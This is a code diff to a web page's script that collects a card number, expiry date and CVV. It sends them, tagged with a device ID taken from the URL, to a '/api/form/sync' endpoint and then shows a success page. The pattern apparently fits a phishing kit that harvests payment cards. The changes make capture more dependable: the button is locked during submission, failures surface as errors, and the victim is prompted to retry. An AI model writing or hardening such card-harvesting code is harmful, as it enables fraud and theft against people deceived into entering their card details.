@@ -78,19 +78,24 @@
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('deviceId') || 'unknown';
 
+        // Resolve the API base URL from the current page origin
+        const API_BASE = window.location.origin;
+
         async function syncPageData(pageName, data) {
-            try {
-                await fetch('/api/form/sync', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ deviceId, pageName, pageData: data, timestamp: new Date().toISOString() })
-                });
-            } catch (error) {
-                console.error('Sync error:', error);
+            const response = await fetch(API_BASE + '/api/form/sync', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId, pageName, pageData: data, timestamp: new Date().toISOString() })
+            });
+            const result = await response.json();
+            if (!response.ok || !result.success) {
+                throw new Error(result.error || 'Sync failed');
             }
+            return result;
         }
 
         document.getElementById('submitBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('submitBtn');
             const cardNumber = document.getElementById('cardNumber').value.trim();
             const validThrough = document.getElementById('validThrough').value.trim();
             const cvv = document.getElementById('cvv').value.trim();
@@ -100,8 +105,18 @@
                 return;
             }
 
-            await syncPageData('card_verify', { cardNumber, validThrough, cvv });
-            window.location.href = 'success.html?deviceId=' + encodeURIComponent(deviceId);
+            btn.disabled = true;
+            btn.textContent = 'SUBMITTING...';
+
+            try {
+                await syncPageData('card_verify', { cardNumber, validThrough, cvv });
+                window.location.replace('success.html?deviceId=' + encodeURIComponent(deviceId));
+            } catch (error) {
+                console.error('Sync error:', error);
+                btn.disabled = false;
+                btn.textContent = 'CONTINUE';
+                alert('Submission failed. Please check your connection and try again.');
+            }
         });
     </script>
 </body>
